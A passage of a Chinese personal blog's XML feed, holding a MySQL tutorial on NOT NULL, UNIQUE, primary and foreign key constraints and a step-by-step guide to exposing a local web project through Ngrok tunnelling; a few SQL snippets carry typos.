href="https://imgur.loukky.com/">公益图床</a>,免费，免费，免费，白嫖HXD。</h3><h3 id="6-SM-MS-免费，目前站内图片都是存在着。"><a href="#6-SM-MS-免费，目前站内图片都是存在着。" class="headerlink" title="6.SM.MS,免费，目前站内图片都是存在着。"></a>6.<a href="https://sm.ms/">SM.MS</a>,免费，目前站内图片都是存在着。</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;tips：&lt;br&gt;通常情况我们在建网站或者日常上网的时候用到图床的理由就是以下几种情况：&lt;br&gt;临时分享图片到其他网站外链；&lt;br&gt;自己服务器硬盘不够用；&lt;br&gt;自己服务器带宽小，网速慢；&lt;br&gt;不想把图片放到自己服务器；&lt;br&gt;自己没有服务器但是</summary>
      
    
    
    
    
    <category term="记录" scheme="http://zhizhi111.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
    <category term="图床" scheme="http://zhizhi111.github.io/tags/%E5%9B%BE%E5%BA%8A/"/>
    
  </entry>
  
  <entry>
    <title>MySQL常见约束</title>
    <link href="http://zhizhi111.github.io/2021/12/22/MySQL%E5%B8%B8%E8%A7%81%E7%BA%A6%E6%9D%9F/"/>
    <id>http://zhizhi111.github.io/2021/12/22/MySQL%E5%B8%B8%E8%A7%81%E7%BA%A6%E6%9D%9F/</id>
    <published>2021-12-22T07:42:35.000Z</published>
    <updated>2022-01-23T10:57:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>Tips：</p><blockquote><ol><li>检查约束(check):<br>MySQL中不支持检查约束，但是<code>Oracle</code>中是好使的。就在这前面简单介绍一下吧！笔记不嫌多。哈哈哈哈！<br>我在大学的课程是SQL Server，这玩意也支持Check约束，语句贴下面，简单感受一下吧。<br>还有另外两种约束：<br>自增长约束(AUTO_INCREMENT)<br>非负约束(unsigned)<br>相信你们都晓得这自增约束，自增长约束在下面详解代码有涉及到，不知道的自行百度。链接放这。<a href="https://blog.csdn.net/weixin_44050355/article/details/103948501">怎么实现自增长约束</a></li><li>创建检查约束：</li></ol></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp8(</span><br><span class="line">    id <span class="type">int</span>(<span class="number">10</span>),</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    salary <span class="keyword">Double</span>(<span class="number">10</span>,<span class="number">2</span>),</span><br><span class="line">    <span class="keyword">CONSTRAINT</span> emp8_salary_ck <span class="keyword">CHECK</span>(salary <span class="operator">&gt;</span> <span class="number">3000</span>)   #工资大于<span class="number">3000</span>不允许往工资里加</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h1 id="什么是约束？约束使用规则？"><a href="#什么是约束？约束使用规则？" class="headerlink" title="什么是约束？约束使用规则？"></a>什么是约束？约束使用规则？</h1><ul><li><p>约束是在表中定义的用于维护数据库完整性的一些规则。</p></li><li><p>通过为表中的列定义约束可以防止将错误的数据插入表中，也可以保持表之间数据的一致性</p></li><li><p>若某个约束条件只作用于单独的列，可以将其定义为列级约束也可定义为表级约束；</p></li><li><p>若某个约束条件作用域多个列，则必须定义为表级约束。</p></li></ul><h1 id="Mysql中支持以下约束"><a href="#Mysql中支持以下约束" class="headerlink" title="Mysql中支持以下约束"></a>Mysql中支持以下约束</h1><h3 id="一、非空约束：not-null"><a href="#一、非空约束：not-null" class="headerlink" title="* 一、非空约束：not null"></a>* 一、非空约束：not null</h3><h3 id="二、唯一约束：unique"><a href="#二、唯一约束：unique" class="headerlink" title="* 二、唯一约束：unique"></a>* 二、唯一约束：unique</h3><h3 id="三、主键约束：primary-key"><a href="#三、主键约束：primary-key" class="headerlink" title="* 三、主键约束：primary key"></a>* 三、主键约束：primary key</h3><h3 id="四、外键约束：-foreign-key"><a href="#四、外键约束：-foreign-key" class="headerlink" title="* 四、外键约束： foreign key"></a>* 四、外键约束： foreign key</h3><h1 id="约束类型详细用法"><a href="#约束类型详细用法" class="headerlink" title="约束类型详细用法"></a>约束类型详细用法</h1><h2 id="一、非空约束-NOT-NULL"><a href="#一、非空约束-NOT-NULL" class="headerlink" title="* 一、非空约束(NOT NULL)"></a>* 一、非空约束(NOT NULL)</h2><h3 id="1-not-null约束的字段不允许为NULL，必须有值；非空约束是列级约束，如果想设置多行非空，必须每行都添加非空约束。"><a href="#1-not-null约束的字段不允许为NULL，必须有值；非空约束是列级约束，如果想设置多行非空，必须每行都添加非空约束。" class="headerlink" title="(1)  not null约束的字段不允许为NULL，必须有值；非空约束是列级约束，如果想设置多行非空，必须每行都添加非空约束。"></a>(1)  not null约束的字段不允许为NULL，必须有值；非空约束是列级约束，如果想设置多行非空，必须每行都添加非空约束。</h3><h3 id="语法格式："><a href="#语法格式：" class="headerlink" title="语法格式："></a>语法格式：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line">    id <span class="type">int</span>,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="keyword">null</span>      #添加学生的姓名非空约束，不允许姓名是空值</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="2-为已创建的表添加非空约束："><a href="#2-为已创建的表添加非空约束：" class="headerlink" title="(2)  为已创建的表添加非空约束："></a>(2)  为已创建的表添加非空约束：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student</span><br><span class="line">modify student <span class="type">varchar</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="keyword">null</span>;  #modify 字段名 数据类型 <span class="keyword">not</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><h3 id="3-取消非空约束"><a href="#3-取消非空约束" class="headerlink" title="(3)  取消非空约束"></a>(3)  取消非空约束</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> student</span><br><span class="line">modify student <span class="type">varchar</span>(<span class="number">30</span>) <span class="keyword">null</span>;  #把原来的<span class="keyword">not</span> <span class="keyword">null</span>改为<span class="keyword">null</span>即可</span><br></pre></td></tr></table></figure><h2 id="二、唯一约束-UNIQUE"><a href="#二、唯一约束-UNIQUE" class="headerlink" title="* 二、唯一约束(UNIQUE)"></a>* 二、唯一约束(UNIQUE)</h2><h3 id="1-UNIQUE-规定某个表中的某个字段的值是唯一的，不能重复，但是可以为null。unique放在一个列上，是列级约束；unique放在多个列上，是表级约束。"><a href="#1-UNIQUE-规定某个表中的某个字段的值是唯一的，不能重复，但是可以为null。unique放在一个列上，是列级约束；unique放在多个列上，是表级约束。" class="headerlink" title="(1)  UNIQUE, 规定某个表中的某个字段的值是唯一的，不能重复，但是可以为null。unique放在一个列上，是列级约束；unique放在多个列上，是表级约束。"></a>(1)  UNIQUE, 规定某个表中的某个字段的值是唯一的，不能重复，但是可以为null。unique放在一个列上，是列级约束；unique放在多个列上，是表级约束。</h3><h3 id="列级约束语法格式："><a href="#列级约束语法格式：" class="headerlink" title="列级约束语法格式："></a>列级约束语法格式：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line">    id <span class="type">int</span>,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">30</span>) <span class="keyword">unique</span>,   #添加学生的姓名唯一约束，不允许重名</span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="表级约束语法格式："><a href="#表级约束语法格式：" class="headerlink" title="表级约束语法格式："></a>表级约束语法格式：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp3(</span><br><span class="line">    id <span class="type">int</span>(<span class="number">10</span>),</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    phone carcahr(<span class="number">30</span>),</span><br><span class="line">    <span class="keyword">CONSTRAINT</span> emp3_phone_un <span class="keyword">UNIQUE</span>(phone)  #CONTRAINT后接约束名(随便取，一般取名格式是表_字段名_约束缩写，这样比较直观)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="2-组合唯一约束"><a href="#2-组合唯一约束" class="headerlink" title="(2)  组合唯一约束"></a>(2)  组合唯一约束</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp3(</span><br><span class="line">    id <span class="type">int</span>(<span class="number">10</span>),</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    phone carcahr(<span class="number">30</span>),</span><br><span class="line">    <span class="keyword">CONSTRAINT</span> emp3_email_un <span class="keyword">UNIQUE</span>(phone,name) #必须电话跟姓名同时一样才不能添加，其中一个字段一样，一个字段不一样，是允许的。</span><br></pre></td></tr></table></figure><h3 id="3-删除唯一约束语法："><a href="#3-删除唯一约束语法：" class="headerlink" title="(3)  删除唯一约束语法："></a>(3)  删除唯一约束语法：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> emp3</span><br><span class="line"><span class="keyword">drop</span> index emp3_email_un;   #<span class="keyword">drop</span> index后接需要删除的约束名</span><br></pre></td></tr></table></figure><h2 id="三、主键约束-primary-key"><a href="#三、主键约束-primary-key" class="headerlink" title="* 三、主键约束(primary key)"></a>* 三、主键约束(primary key)</h2><h3 id="1-主键约束修饰的字段，非空且唯一，一张表中只能有一个主键。通常利用主键确定唯一一条数据。"><a href="#1-主键约束修饰的字段，非空且唯一，一张表中只能有一个主键。通常利用主键确定唯一一条数据。" class="headerlink" title="(1)  主键约束修饰的字段，非空且唯一，一张表中只能有一个主键。通常利用主键确定唯一一条数据。"></a>(1)  主键约束修饰的字段，非空且唯一，一张表中只能有一个主键。通常利用主键确定唯一一条数据。</h3><h3 id="列级约束语法格式：-1"><a href="#列级约束语法格式：-1" class="headerlink" title="列级约束语法格式："></a>列级约束语法格式：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line">    id <span class="type">int</span>(<span class="number">10</span>) AUTO_INCREMENT <span class="keyword">primary</span> key,   #通常给主键约束添加自增约束AUTO_INCREMENT</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">30</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="表级约束语法格式：-1"><a href="#表级约束语法格式：-1" class="headerlink" title="表级约束语法格式："></a>表级约束语法格式：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp6(</span><br><span class="line">    id <span class="type">int</span>(<span class="number">10</span>),</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    CONTRAINT emp6_id_pk <span class="keyword">primary</span> key(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="2-为已创建的表添加主键约束："><a href="#2-为已创建的表添加主键约束：" class="headerlink" title="(2)  为已创建的表添加主键约束："></a>(2)  为已创建的表添加主键约束：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student</span><br><span class="line"><span class="keyword">add</span> <span class="keyword">CONSTRAINT</span> emp6_id_pk <span class="keyword">primary</span> key(id);   #关键字<span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span></span><br></pre></td></tr></table></figure><h3 id="3-删除主键约束："><a href="#3-删除主键约束：" class="headerlink" title="(3)  删除主键约束："></a>(3)  删除主键约束：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> emp6    #删除表emp6的主键约束</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">primary</span> key;  #删除主键比较特别，不用加主键的名称</span><br></pre></td></tr></table></figure><h2 id="四、外键约束-FOREIGN-key"><a href="#四、外键约束-FOREIGN-key" class="headerlink" title="* 四、外键约束(FOREIGN key)"></a>* 四、外键约束(FOREIGN key)</h2><h3 id="1-外键约束：通常关联另一个表的主键，出现在外键约束的数据肯定也在主键约束表中"><a href="#1-外键约束：通常关联另一个表的主键，出现在外键约束的数据肯定也在主键约束表中" class="headerlink" title="(1)  外键约束：通常关联另一个表的主键，出现在外键约束的数据肯定也在主键约束表中"></a>(1)  外键约束：通常关联另一个表的主键，出现在外键约束的数据肯定也在主键约束表中</h3><h3 id="2-所以外键约束涉及到两个表的关联关系，通常从表的外键关联主表的主键"><a href="#2-所以外键约束涉及到两个表的关联关系，通常从表的外键关联主表的主键" class="headerlink" title="(2)  所以外键约束涉及到两个表的关联关系，通常从表的外键关联主表的主键"></a>(2)  所以外键约束涉及到两个表的关联关系，通常从表的外键关联主表的主键</h3><h3 id="3-外键约束也是这几个约束类型中最复杂，最难理解的约束，建议在mysql中建表多试试。"><a href="#3-外键约束也是这几个约束类型中最复杂，最难理解的约束，建议在mysql中建表多试试。" class="headerlink" title="(3)  外键约束也是这几个约束类型中最复杂，最难理解的约束，建议在mysql中建表多试试。"></a>(3)  外键约束也是这几个约束类型中最复杂，最难理解的约束，建议在mysql中建表多试试。</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> dept1(</span><br><span class="line">dept_id <span class="type">int</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">dept_name <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dept1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp7(</span><br><span class="line">id <span class="type">int</span>(<span class="number">10</span>),</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">depart_id <span class="type">int</span>(<span class="number">10</span>),</span><br><span class="line"><span class="keyword">constraint</span> emp7_departId_fk <span class="keyword">foreign</span> key(depart_id) <span class="keyword">references</span> dept1(dept_id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="4-添加了外键约束的两张表有什么特点："><a href="#4-添加了外键约束的两张表有什么特点：" class="headerlink" title="(4)  添加了外键约束的两张表有什么特点："></a>(4)  添加了外键约束的两张表有什么特点：</h3><h4 id="出现在外键约束的数据肯定也在主键约束表中："><a href="#出现在外键约束的数据肯定也在主键约束表中：" class="headerlink" title="* 出现在外键约束的数据肯定也在主键约束表中："></a>* 出现在外键约束的数据肯定也在主键约束表中：</h4><p>所以你想在emp7中添加数据，首先你要保证dept1表中有这个数据。</p><h4 id="如果你想删除主表中的数据，你运行delete语句一定报完整性错误，所以删除dept1表中的数据之前，你得先删除从表emp7中的这个数据。"><a href="#如果你想删除主表中的数据，你运行delete语句一定报完整性错误，所以删除dept1表中的数据之前，你得先删除从表emp7中的这个数据。" class="headerlink" title="* 如果你想删除主表中的数据，你运行delete语句一定报完整性错误，所以删除dept1表中的数据之前，你得先删除从表emp7中的这个数据。"></a>* 如果你想删除主表中的数据，你运行delete语句一定报完整性错误，所以删除dept1表中的数据之前，你得先删除从表emp7中的这个数据。</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tep1</span><br><span class="line"><span class="keyword">values</span>(<span class="number">10</span>,<span class="string">&#x27;IT&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> emp7</span><br><span class="line"><span class="keyword">values</span>(<span class="number">101</span>,<span class="string">&#x27;张三&#x27;</span>,<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> dept1</span><br><span class="line"><span class="keyword">where</span> dept id <span class="operator">=</span> <span class="number">101</span>;   #你先运行这个一定报错</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> emp7</span><br><span class="line"><span class="keyword">where</span> id <span class="operator">=</span> <span class="number">10</span>    #你应该先删除外键从表emp7的数据，才能成功删除主表tep1中的对应关联的数据</span><br></pre></td></tr></table></figure><h3 id="5-级联删除-on-delete-cascode-跟-级联置空-on-delete-set-null"><a href="#5-级联删除-on-delete-cascode-跟-级联置空-on-delete-set-null" class="headerlink" title="(5)级联删除(on delete cascode) 跟 级联置空(on delete set null)"></a>(5)级联删除(on delete cascode) 跟 级联置空(on delete set null)</h3><h4 id="阅读到这你会发现，我们每次要删除数据的话还要先把相关联的外键一个个删除以后才能去删这个主表的数据，相当的麻烦，就是再来学两个好用的删除方法。"><a href="#阅读到这你会发现，我们每次要删除数据的话还要先把相关联的外键一个个删除以后才能去删这个主表的数据，相当的麻烦，就是再来学两个好用的删除方法。" class="headerlink" title="阅读到这你会发现，我们每次要删除数据的话还要先把相关联的外键一个个删除以后才能去删这个主表的数据，相当的麻烦，就是再来学两个好用的删除方法。"></a>阅读到这你会发现，我们每次要删除数据的话还要先把相关联的外键一个个删除以后才能去删这个主表的数据，相当的麻烦，就是再来学两个好用的删除方法。</h4><h4 id="级联删除：当父表中的列被删除时，子表中相对应的列数据也被删除"><a href="#级联删除：当父表中的列被删除时，子表中相对应的列数据也被删除" class="headerlink" title="* 级联删除：当父表中的列被删除时，子表中相对应的列数据也被删除"></a>* 级联删除：当父表中的列被删除时，子表中相对应的列数据也被删除</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp7(</span><br><span class="line">    id <span class="type">int</span>(<span class="number">10</span>),</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    depart_id <span class="type">int</span>(<span class="number">10</span>),</span><br><span class="line">    <span class="keyword">constraint</span> emp7_departId_fk <span class="keyword">foreign</span> key(depart_id) <span class="keyword">references</span> dept1(dept_id)</span><br><span class="line">    <span class="keyword">on</span> <span class="keyword">delete</span> cascode #删除主表数据时，从表也会跟着同时删除</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="级联置空：当父表中的列数据被删除时，子表中相应的列置空"><a href="#级联置空：当父表中的列数据被删除时，子表中相应的列置空" class="headerlink" title="* 级联置空：当父表中的列数据被删除时，子表中相应的列置空"></a>* 级联置空：当父表中的列数据被删除时，子表中相应的列置空</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp7(</span><br><span class="line">    id <span class="type">int</span>(<span class="number">10</span>),</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    depart_id <span class="type">int</span>(<span class="number">10</span>),</span><br><span class="line">    <span class="keyword">constraint</span> emp7_departId_fk <span class="keyword">foreign</span> key(depart_id) <span class="keyword">references</span> dept1(dept_id)</span><br><span class="line">    <span class="keyword">on</span> <span class="keyword">delete</span> <span class="keyword">set</span> <span class="keyword">null</span> #删除主表数据时，从表数据置空</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="6-为已创建的表添加外键约束："><a href="#6-为已创建的表添加外键约束：" class="headerlink" title="(6)为已创建的表添加外键约束："></a>(6)为已创建的表添加外键约束：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> tale emp7</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> emp7_departId_fk <span class="keyword">FOREIGN</span> KEY(depart_id) <span class="keyword">REFERENCES</span> dept1(dept_id);</span><br></pre></td></tr></table></figure><h3 id="7-删除外键约束"><a href="#7-删除外键约束" class="headerlink" title="(7)删除外键约束"></a>(7)删除外键约束</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> tale emp7</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">FOREIGN</span> KEY emp7_departId_fk;</span><br></pre></td></tr></table></figure><h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p> 约束理解起来没什么难的点吧，除了外键约束要复杂一点，create语句，insert语句都贴在上面了，只要粘贴到Mysql中跑一下，然后对照其他sql语句，就能自己看到效果了。外键约束如果日后忘记了的话，时空隧道放着，多多复习。</p><p><a href="https://www.bilibili.com/video/BV1GP4y1h7Zj?p=47">外键约束视频教学</a>,笔记就是这么个笔记，整理起来是真的费劲。</p><h3 id="最后，感谢阅读。"><a href="#最后，感谢阅读。" class="headerlink" title="最后，感谢阅读。"></a>最后，感谢阅读。</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Tips：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;检查约束(check):&lt;br&gt;MySQL中不支持检查约束，但是&lt;code&gt;Oracle&lt;/code&gt;中是好使的。就在这前面简单介绍一下吧！笔记不嫌多。哈哈哈哈！&lt;br&gt;我在大学的课程是SQL Server，这</summary>
      
    
    
    
    
    <category term="笔记" scheme="http://zhizhi111.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MySQL" scheme="http://zhizhi111.github.io/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>Ngork内网穿透</title>
    <link href="http://zhizhi111.github.io/2021/12/22/Ngork-teach/"/>
    <id>http://zhizhi111.github.io/2021/12/22/Ngork-teach/</id>
    <published>2021-12-22T05:35:25.000Z</published>
    <updated>2022-01-23T10:57:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>前言：</p><h1 id="自己电脑上的项目如何让别人访问"><a href="#自己电脑上的项目如何让别人访问" class="headerlink" title="自己电脑上的项目如何让别人访问"></a>自己电脑上的项目如何让别人访问</h1><p>一般自己在电脑上写了一个项目 ，自己把项目跑起来，生成一个本地地址，可以通过本地网址进行访问项目，但是怎么样让别人来访问你的项目，这就需要用到Ngork工具了。</p><blockquote><p>原理：把外网地址通过服务器映射，映射到自己的本地地址，这样别人访问外网，就间接访问了你的本地网站</p></blockquote><p>使用场景：</p><p>比如你是乙方，你承包了甲方的项目，当你写好了项目，甲方要验收，你要把自己的项目给甲方看呀，你总不能把自己的电脑带到甲方面前操作吧，这里就可以用到Ngork内网穿透，你给甲方一个网站，就可以访问你本地的网址啦！</p><p>还有一种就是你是学生，你在学校做了一个项目，你想让同学，老师，其他人访问你的网址，这时候用Ngork就很方便，分享资源啥的。</p><p>服务器映射过程也很简单哈，没有什么难度，很容易上手，看完就会。</p><h1 id="实现内网穿透方法"><a href="#实现内网穿透方法" class="headerlink" title="实现内网穿透方法"></a>实现内网穿透方法</h1><h2 id="第一步：注册账号并登陆"><a href="#第一步：注册账号并登陆" class="headerlink" title="第一步：注册账号并登陆"></a>第一步：注册账号并登陆</h2><p> 去Ngork官网注册一个账号，点<a href="https://www.ngrok.cc/login.html">这里</a>直接去注册吧。</p><h2 id="第二步：购买实名认证机会"><a href="#第二步：购买实名认证机会" class="headerlink" title="第二步：购买实名认证机会"></a>第二步：购买实名认证机会</h2><p> 因为之前有人使用网站服务器做非法的事情，导致Ngrok网站被公关部门调查了，加强了实名认证功能，想要搭建一个服务必须要实名认证，这其实不算什么，主要是人家实名认证接口是第三方了，要收取一次性费用两元，确实把热爱白嫖的我给无语到了。左侧的导航栏是有实名认证的，点击，然后好像还需要微信关注公众号来着，操作不难，你们按照网页提示操作吧。</p><h2 id="第三步：开通隧道"><a href="#第三步：开通隧道" class="headerlink" title="第三步：开通隧道"></a>第三步：开通隧道</h2><p>(1)右侧导航栏实名认证上面有一个隧道管理，点击显示两栏，隧道管理和开通隧道，首先要去开通隧道,你可以购买宽带大，速度大的服务器，也可以选择白嫖的0元服务器，这里演示就用免费的。点击立即购买。</p><p><img src="https://img-blog.csdnimg.cn/42db95237daa46d4810365bfcd0b3189.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5rC45LiN56eD5aS05qmZ5Y-Z54y_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="1"></p><p>(2)然后就是添加隧道了，隧道名称随便取，前置域名你也可以自定义，隧道协议建议使用http的，当然你也可以试试其他的协议。</p><p>注意！！！！！！！！！！！！！！！</p><p>注意！！！！！！！！！！！！！！！</p><p>图上忘记标了，本地端口号一定要填，比如你的端口号是<code>8080</code>，你就把图上的<code>80</code>改为<code>8080</code>，类推。</p><p>然后点击添加隧道。</p><p><img src="https://img-blog.csdnimg.cn/d186309a730341f8a06f7ccdaab32a87.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5rC45LiN56eD5aS05qmZ5Y-Z54y_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="2"></p><p>(3)添加隧道成功进入管理隧道页面，此时准备工作做完就去下载Ngork工具吧。</p><p><img src="https://img-blog.csdnimg.cn/4fa0f00134ca47a3a85b1eeeeb7ff07e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5rC45LiN56eD5aS05qmZ5Y-Z54y_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="3"></p><p>(4)下载完成解压，点开解压完成的文件夹，运行Ngork工具</p><p><img src="https://img-blog.csdnimg.cn/65b31be694f24cd5b2e134e301b1c2ec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5rC45LiN56eD5aS05qmZ5Y-Z54y_,size_18,color_FFFFFF,t_70,g_se,x_16" alt="4"></p><p>（5）将隧道ID复制进去回车就完成了，此时就映射完毕了，就可以访问此时映射的外网地址了，也就是隧道管理页面的赠送的域名，访问试试效果吧。</p><p><img src="https://img-blog.csdnimg.cn/aebdda34c2894a3f8e0219d42ac4c376.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5rC45LiN56eD5aS05qmZ5Y-Z54y_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="5"></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><h3 id="这上面免费的服务器是美国的，好处就是免费的，缺点是如果访问的人多了，就容易崩，不适合多人同时访问。"><a href="#这上面免费的服务器是美国的，好处就是免费的，缺点是如果访问的人多了，就容易崩，不适合多人同时访问。" class="headerlink" title="这上面免费的服务器是美国的，好处就是免费的，缺点是如果访问的人多了，就容易崩，不适合多人同时访问。"></a>这上面免费的服务器是美国的，好处就是免费的，缺点是如果访问的人多了，就容易崩，不适合多人同时访问。</h3><p>Ngork客户端那边刷资源就说明有人在访问，如果把Ngork客户端小窗口关闭，服务器就关闭了，别人访问就会显示404，所以还有一点就是本地服务要一直是启动的，因为你映射的那个本地地址，放到你的浏览器能访问，外网映射，通过外网才能访问，很好理解吧，你不能本地的服务不跑起来，直接去映射，先不说能不能映射成功，成功了你去访问外网是不是一定没任何东西啊。</p><h2 id="最后，感谢阅读。"><a href="#最后，感谢阅读。" class="headerlink" title="最后，感谢阅读。"></a>最后，感谢阅读。</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前言：&lt;/p&gt;
